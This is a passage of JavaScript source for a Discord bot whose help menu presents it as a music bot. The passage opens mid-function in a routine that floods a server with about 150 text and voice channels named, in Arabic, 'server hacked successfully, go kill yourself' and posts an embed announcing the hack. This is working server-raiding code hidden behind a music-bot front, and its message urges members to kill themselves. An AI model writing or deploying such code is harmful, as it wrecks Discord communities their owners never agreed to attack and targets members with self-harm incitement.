	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
     message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'text').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));
	 message.guild.createChannel('تم تهكير السيرفر بنجاح ✅ روح انتحر `', 'voice').then(c=> c.send(ra3d));	 
     let ra3d = new Discord.RichEmbed()
            .setColor('RANDOM')
            .setDescription('http://www8.0zz0.com/2018/12/07/13/372983551.jpg تم تهكير السيرفر بنجاح ✅')
           message.channel.sendEmbed(ra3d);
})
})
})
})
}
});  
  
  
  
client.on('message', message => {
    if (message.content === 'Lhelp') {
        let helpEmbed = new Discord.RichEmbed()
        .setThumbnail(message.author.avatarURL)
        .setTitle(':headphones: **أوامر الميوزك**')
        .setDescription('** ( L ) برفكس البوت**')
        .addField('play', 'لتشغيل اغنية')
        .addField('stop', 'لأيقاف البوت وخروجه من الروم الصوتي')
        .addField('skip', 'لتخطي الأغنية')
        .addField('pause', 'لايقاف الاغنية مؤقتًا')
        .addField('resume', 'لتكملة الاغنية')
        .addField('queue', 'لاظهار قائمة التشغيل')
        .addField('np', 'لاظهار الأغنية المشغلة حاليًا')
        .addField('vol', 'لتغيير درجة الصوت 0 - 100')
	.addField('ping', 'لاظهار سرعة اتصال البوت')
        .setColor('#e9ab26')
      message.channel.sendEmbed(helpEmbed);
    }
});  
  
   
   
   
  
client.login(process.env.BOT_TOKEN);
